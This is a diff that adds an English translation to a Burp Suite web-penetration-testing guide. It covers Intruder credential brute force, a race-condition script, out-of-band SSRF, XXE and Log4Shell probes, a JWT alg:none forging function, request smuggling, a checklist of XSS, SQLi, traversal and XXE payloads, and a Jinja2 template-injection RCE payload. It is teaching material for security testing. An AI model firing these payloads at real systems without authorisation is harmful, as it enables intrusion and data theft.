@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Burp Suite 실전 완전 정복
 
 ## Burp Suite 아키텍처 이해
@@ -1100,6 +1106,348 @@ User Options → Performance:
 
 ```bash
 # Burp 시작 스크립트
+#!/bin/bash
+BURP_PATH="/opt/BurpSuitePro/burpsuite_pro.jar"
+java \
+  -jar $BURP_PATH \
+  -Xmx2g \
+  -Djava.awt.headless=false \
+  --unpause-spider-and-scanner \
+  2>/dev/null &
+```
+
+---
+
+<a name="english"></a>
+
+# Burp Suite Advanced Mastery
+
+## Burp Suite Architecture Overview
+
+```
+Browser ──► Proxy (8080) ──► Target Server
+              │
+        Burp Suite
+        ├── Proxy      ← HTTP intercept/modify
+        ├── Scanner    ← Automated vulnerability detection (Pro)
+        ├── Intruder   ← Automated attacks
+        ├── Repeater   ← Manual request replay
+        ├── Decoder    ← Encoding/decoding
+        ├── Comparer   ← Response comparison
+        ├── Logger     ← Full traffic log
+        └── Extender   ← Plugin management
+```
+
+---
+
+## 1. Advanced Proxy Configuration
+
+### Intercept Filter Rules
+
+```
+Proxy → Intercept → And URL Is In Target Scope
+→ Traffic outside scope passes automatically, only in-scope is intercepted
+```
+
+**Proxy History Filtering:**
+```
+Filter: Show only in-scope items
+Filter: Show only parameterized requests
+Filter: Hide CSS, image, general binary
+```
+
+### Match & Replace (Auto Header Injection)
+
+```
+Proxy → Options → Match and Replace
+→ Add:
+  Type: Request Header
+  Match: ^
+  Replace: X-Forwarded-For: 127.0.0.1
+```
+
+---
+
+## 2. Intruder Complete Guide
+
+### Attack Type Selection Guide
+
+| Type | Behavior | Use Case |
+|------|----------|----------|
+| **Sniper** | Single payload set, sequential markers | Single parameter fuzzing |
+| **Battering Ram** | Same payload to all markers simultaneously | username=admin&password=admin |
+| **Pitchfork** | Multiple payload sets in parallel | Credential stuffing |
+| **Cluster Bomb** | Generate all combinations | Password brute force |
+
+### Cluster Bomb Credential Attack
+
+```
+Position Setup:
+POST /login HTTP/1.1
+...
+username=§admin§&password=§password§
+
+Payload set 1: Username list
+Payload set 2: Password list
+
+Options → Grep - Match:
+  "Invalid credentials" → failure
+  "Welcome" → success
+```
+
+---
+
+## 3. Key Burp Suite Extensions
+
+### Autorize (IDOR Auto-Detection)
+
+```
+Install: BApp Store → Autorize
+
+Setup:
+1. Log in with low-privilege account
+2. Paste cookie/token into Autorize
+3. Browse with high-privilege account
+4. Autorize re-sends each request with low privilege
+
+Results:
+  Red (Bypassed!) → IDOR vulnerability found
+  Yellow (Is enforced?) → Manual verification needed
+  Green (Is enforced!) → Normal access control
+```
+
+### Param Miner (Hidden Parameter Discovery)
+
+```
+Install: BApp Store → Param Miner
+
+Right-click → Extensions → Param Miner → Guess params
+→ Automatically tries thousands of parameter names
+
+Discovery examples:
+  ?debug=true → Activate debug mode
+  ?admin=1 → Gain admin privileges
+  ?beta=true → Access unreleased features
+  ?internal=true → Internal API endpoints
+```
+
+### Turbo Intruder (High-Speed Requests)
+
+```python
+# race_condition.py — Turbo Intruder script (runs inside Burp Suite)
+#
+# Usage:
+#   1. Right-click target request in Burp Proxy History
+#   2. Extensions > Turbo Intruder > Send to Turbo Intruder
+#   3. Paste this script → Click Attack
+#
+# Gate technique: queue requests then release simultaneously with openGate
+# → Triggers race conditions when server can't handle concurrent requests
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=50,
+        requestsPerConnection=1,
+        pipeline=False,
+        engine=Engine.THREADED,
+    )
+
+    # Queue 100 requests in gate 'race1' for simultaneous sending
+    for i in range(100):
+        engine.queue(target.req, str(i), gate='race1')
+
+    engine.openGate('race1')
+    engine.complete(timeout=30)
+
+
+def handleResponse(req, interesting):
+    if req.status == 200:
+        table.add(req)
+```
+
+---
+
+## 4. Burp Collaborator Usage (OOB Vulnerabilities)
+
+### DNS/HTTP Callbacks for Blind Vulnerability Detection
+
+```bash
+# SSRF test
+GET /fetch?url=http://burpcollaborator.net/ssrf-test
+
+# Blind XSS test  
+"><script src="//burpcollaborator.net/xss"></script>
+
+# XXE OOB detection
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://burpcollaborator.net/xxe">
+]>
+<data>&xxe;</data>
+
+# Log4Shell detection
+${jndi:ldap://burpcollaborator.net/log4shell}
+```
+
+---
+
+## 5. JWT Attack Practice
+
+### JWT Structure Analysis
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
+eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+header.payload.signature
+
+Header: {"alg":"HS256","typ":"JWT"}
+Payload: {"sub":"1234","name":"John","role":"user"}
+Signature: HMAC-SHA256(header+payload, secret_key)
+```
+
+### JWT Attack Techniques
+
+The JWT vulnerability analysis CLI below supports alg:none attacks, RS256→HS256 algorithm confusion, secret key cracking, and payload forgery.
+
+```python
+#!/usr/bin/env python3
+"""
+JWT Vulnerability Analysis and Attack CLI
+Requirements: pip install pyjwt cryptography requests
+"""
+
+def attack_alg_none(token: str, payload_override=None) -> str:
+    """alg:none attack — generate JWT without signature"""
+    import base64, json
+    
+    parts = token.split(".")
+    def _b64_decode(data):
+        padding = 4 - len(data) % 4
+        data += "=" * (padding % 4)
+        return json.loads(base64.urlsafe_b64decode(data))
+    
+    _, payload = _b64_decode(parts[0]), _b64_decode(parts[1])
+    if payload_override:
+        payload.update(payload_override)
+
+    new_header = {"alg": "none", "typ": "JWT"}
+
+    def _b64_encode(data):
+        return base64.urlsafe_b64encode(
+            json.dumps(data, separators=(",", ":")).encode()
+        ).rstrip(b"=").decode()
+
+    return f"{_b64_encode(new_header)}.{_b64_encode(payload)}."
+```
+
+---
+
+## 6. HTTP Request Smuggling
+
+### CL.TE Smuggling (Content-Length + Transfer-Encoding)
+
+```http
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+### Detecting Smuggling with Burp
+
+```
+Install HTTP Request Smuggler extension
+Right-click → Extensions → HTTP Request Smuggler → Smuggle probe
+
+Automatically tests CL.TE, TE.CL, TE.TE
+```
+
+---
+
+## 7. Practical Bug Finding Checklist
+
+```
+□ XSS payloads on all parameters: <script>alert(1)</script>
+□ Numeric parameter IDOR: id=1 → id=2, id=0, id=-1
+□ File upload: try .php, .jsp, .aspx extensions
+□ Redirect parameters: redirect=javascript:alert(1)
+□ Host header manipulation: Host: evil.com (cache poisoning)
+□ X-Forwarded-Host: evil.com (password reset link hijacking)
+□ Content-Type change: JSON → XML → XXE attempt
+□ HTTP methods: GET→POST, POST→PUT, arbitrary methods
+□ API version: /v1/ → /v2/, /api/v1/ → /api/
+□ Path traversal: ../../../etc/passwd
+□ SQLi: ', ", 1=1--, SLEEP(5)
+□ SSTI: {{7*7}}, ${7*7}, <%= 7*7 %>
+□ NoSQLi: {"$gt": ""}, {"$where": "sleep(5000)"}
+□ LDAP Injection: *)(|(uid=*
+□ XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+□ Deserialization: Insert malicious objects into Java/PHP serialized data
+□ Clickjacking: Verify X-Frame-Options header is missing
+□ CORS: Origin: evil.com → Check Access-Control-Allow-Origin response
+```
+
+---
+
+## 8. SSTI (Server-Side Template Injection) Detection
+
+### Detection Payloads by Template Engine
+
+```
+Detection Order: Insert math expressions into all user input parameters
+→ If server returns calculated result, SSTI vulnerability exists
+
+Jinja2 (Python/Flask):
+  {{7*7}}          → 49  (basic detection)
+  {{7*7}}          → 49
+  {{config}}       → App configuration exposed
+
+Twig (PHP):
+  {{7*7}}          → 49
+
+FreeMarker (Java):
+  ${7*7}           → 49
+  
+ERB (Ruby):
+  <%= 7*7 %>       → 49
+```
+
+### SSTI → RCE Exploit (Jinja2)
+
+```python
+# Jinja2 RCE — Python built-in function chain
+{{''.__class__.__mro__[1].__subclasses__()}}
+# → Outputs list of all Python classes
+
+# Simple RCE (when no filtering)
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+```
+
+---
+
+## 9. Burp Suite Performance Optimization
+
+```
+Project Options → Connections:
+  Hostname resolution: Use platform default
+  Timeouts: 10s (reduce)
+  Retry on failure: OFF (speed)
+
+User Options → Performance:
+  Java heap: 2048MB+ (jvm_args -Xmx2g)
+  
+  Launch command:
+  java -jar -Xmx2g burpsuite_pro.jar
+```
+
+```bash
+# Burp startup script
 #!/bin/bash
 BURP_PATH="/opt/BurpSuitePro/burpsuite_pro.jar"
 java \
